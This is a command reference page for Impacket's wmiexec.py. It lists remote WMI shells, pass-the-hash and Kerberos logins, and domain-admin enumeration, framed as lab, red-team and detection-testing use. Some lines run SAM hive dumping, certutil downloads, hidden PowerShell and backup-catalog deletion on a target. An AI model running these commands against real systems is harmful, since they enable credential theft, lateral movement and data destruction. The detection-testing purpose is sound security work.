# wmiexec

> Impacket’s wmiexec.py: a semi-interactive shell over DCOM/WMI that leaves fewer artefacts than service-based execution.

- Category: Lateral Movement
- Commands: 30
- Page: https://terminal.rokibulroni.com/tool/lateral/wmiexec
- Homepage: https://github.com/fortra/impacket
- Documentation: https://github.com/fortra/impacket
- Tags: remote execution, WMI, Impacket

## Install

- apt: `sudo apt install python3-impacket`
- pipx: `pipx install impacket`

## Basic Remote Execution

### wmiexec.py administrator@192.168.1.10

```bash
wmiexec.py administrator@192.168.1.10
```

Initiates a semi-interactive shell on the target using a username and password prompt.

### wmiexec.py administrator:password123@192.168.1.10

```bash
wmiexec.py administrator:password123@192.168.1.10
```

Connects to the target with the password provided inline in the command string.


## Target Specification

### wmiexec.py lab_domain/administrator:password123@192.168.1.10

```bash
wmiexec.py lab_domain/administrator:password123@192.168.1.10
```

Authenticates to a specific domain user on the target IP address.

### wmiexec.py administrator:password123@hostname.local

```bash
wmiexec.py administrator:password123@hostname.local
```

Targets a remote host using its DNS hostname instead of an IP address.


## Command Execution Workflows

### wmiexec.py administrator:password123@192.168.1.10 "hostname"

```bash
wmiexec.py administrator:password123@192.168.1.10 "hostname"
```

Executes a single command non-interactively and retrieves the standard output.

### wmiexec.py administrator:password123@192.168.1.10 "ipconfig /all"

```bash
wmiexec.py administrator:password123@192.168.1.10 "ipconfig /all"
```

Runs a detailed network configuration command remotely and exits after output.

### wmiexec.py administrator:password123@192.168.1.10 "whoami /priv"

```bash
wmiexec.py administrator:password123@192.168.1.10 "whoami /priv"
```

Checks the privileges of the executing user on the remote system.


## NTLM Hash Authentication

### wmiexec.py -hashes :32693b11e6aa90eb43d32c72a77c1a1a administrator@192.168.1.10

```bash
wmiexec.py -hashes :32693b11e6aa90eb43d32c72a77c1a1a administrator@192.168.1.10
```

Authenticates using the Pass-the-Hash technique with an NT hash only.

### wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a77c1a1a administrator@192.168.1.10

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a77c1a1a administrator@192.168.1.10
```

Authenticates using the Pass-the-Hash technique with both LM and NT hashes.

### wmiexec.py -hashes :32693b11e6aa90eb43d32c72a77c1a1a lab_domain/admin@192.168.1.10

```bash
wmiexec.py -hashes :32693b11e6aa90eb43d32c72a77c1a1a lab_domain/admin@192.168.1.10
```

Performs Pass-the-Hash authentication for a domain account against a target IP.


## Kerberos Authentication

### wmiexec.py -k -no-pass hostname.lab_domain.local

```bash
wmiexec.py -k -no-pass hostname.lab_domain.local
```

Authenticates using a Kerberos ticket from the KRB5CCNAME environment variable.

### wmiexec.py -k -no-pass -dc-ip 192.168.1.5 hostname.lab_domain.local

```bash
wmiexec.py -k -no-pass -dc-ip 192.168.1.5 hostname.lab_domain.local
```

Uses Kerberos auth while explicitly specifying the Domain Controller IP address.

### wmiexec.py -aesKey 64bit_aes_hex_key_here user@hostname.local

```bash
wmiexec.py -aesKey 64bit_aes_hex_key_here user@hostname.local
```

Authenticates using an AES256 key for explicit Kerberos key usage.


## Output and Logging

### wmiexec.py -debug administrator:password123@192.168.1.10

```bash
wmiexec.py -debug administrator:password123@192.168.1.10
```

Runs the tool in debug mode to display detailed connection and execution logs.

### wmiexec.py -codec utf-8 administrator:password123@192.168.1.10

```bash
wmiexec.py -codec utf-8 administrator:password123@192.168.1.10
```

Sets the output text encoding codec to handle non-ASCII characters correctly.


## Lateral Movement Simulation

### wmiexec.py administrator:password123@192.168.1.10 "net user /domain"

```bash
wmiexec.py administrator:password123@192.168.1.10 "net user /domain"
```

Simulates lateral reconnaissance by querying domain users from a compromised host.

### wmiexec.py administrator:password123@192.168.1.10 "net group 'Domain Admins' /domain"

```bash
wmiexec.py administrator:password123@192.168.1.10 "net group 'Domain Admins' /domain"
```

Simulates privileged group enumeration often performed after initial access.

### wmiexec.py administrator:password123@192.168.1.10 "type C:\Users\Administrator\Desktop\flag.txt"

```bash
wmiexec.py administrator:password123@192.168.1.10 "type C:\Users\Administrator\Desktop\flag.txt"
```

Simulates data exfiltration or looting by reading specific files from the target.


## Blue Team Defensive Validation

### wmiexec.py administrator:password123@192.168.1.10 "powershell -nop -w hidden -c 'Write-Host Test'"

```bash
wmiexec.py administrator:password123@192.168.1.10 "powershell -nop -w hidden -c 'Write-Host Test'"
```

Executes PowerShell via WMI to test detection of child process creation events.

### wmiexec.py administrator:password123@192.168.1.10 "certutil -urlcache -split -f http://127.0.0.1/test test.exe"

```bash
wmiexec.py administrator:password123@192.168.1.10 "certutil -urlcache -split -f http://127.0.0.1/test test.exe"
```

Tests detection rules for ingress tool transfer using living-off-the-land binaries.

### wmiexec.py administrator:password123@192.168.1.10 "reg save HKLM\SAM sam.save"

```bash
wmiexec.py administrator:password123@192.168.1.10 "reg save HKLM\SAM sam.save"
```

Simulates credential dumping activity to validate registry access alerting.


## Advanced and Combined Workflows

### wmiexec.py -shell-type powershell administrator:password123@192.168.1.10

```bash
wmiexec.py -shell-type powershell administrator:password123@192.168.1.10
```

Instantiates the remote shell using PowerShell instead of the default CMD (if supported).

### wmiexec.py -ts administrator:password123@192.168.1.10

```bash
wmiexec.py -ts administrator:password123@192.168.1.10
```

Prepends timestamps to the output logs for better timeline analysis during testing.


## Incident Response Simulation

### wmiexec.py administrator:password123@192.168.1.10 "tasklist /v"

```bash
wmiexec.py administrator:password123@192.168.1.10 "tasklist /v"
```

remotely lists running processes to identify suspicious activity or confirm execution.

### wmiexec.py administrator:password123@192.168.1.10 "netstat -anob"

```bash
wmiexec.py administrator:password123@192.168.1.10 "netstat -anob"
```

Retrieves active network connections and associated binaries for forensic triage.


## Automation and Scripting

### wmiexec.py -no-output administrator:password123@192.168.1.10 "ping -n 1 127.0.0.1"

```bash
wmiexec.py -no-output administrator:password123@192.168.1.10 "ping -n 1 127.0.0.1"
```

Executes a command blindly without waiting for or retrieving the output file.

### wmiexec.py administrator:password123@192.168.1.10 "dir C:\Windows\System32\drivers\etc\hosts"

```bash
wmiexec.py administrator:password123@192.168.1.10 "dir C:\Windows\System32\drivers\etc\hosts"
```

Verifies file existence remotely, often used in automated configuration checks.


## Purple Team Detection Testing

### wmiexec.py administrator:password123@192.168.1.10 "vssadmin list shadows"

```bash
wmiexec.py administrator:password123@192.168.1.10 "vssadmin list shadows"
```

Executes commands often associated with ransomware reconnaissance to test EDR logic.

### wmiexec.py administrator:password123@192.168.1.10 "wbadmin delete catalog -quiet"

```bash
wmiexec.py administrator:password123@192.168.1.10 "wbadmin delete catalog -quiet"
```

Simulates backup deletion attempts to trigger high-severity backup tampering alerts.


## Cleanup and Safe Termination

### wmiexec.py administrator:password123@192.168.1.10 "del C:\Windows\Temp\wmi_output_*.txt"

```bash
wmiexec.py administrator:password123@192.168.1.10 "del C:\Windows\Temp\wmi_output_*.txt"
```

Manually cleans up any artifact files left if the automatic cleanup mechanism fails.

## Related tools

- [PsExec](https://terminal.rokibulroni.com/tool/lateral/psexec)
- [smbexec](https://terminal.rokibulroni.com/tool/lateral/smbexec)
- [CrackMapExec / NetExec](https://terminal.rokibulroni.com/tool/lateral/crackmapexec)
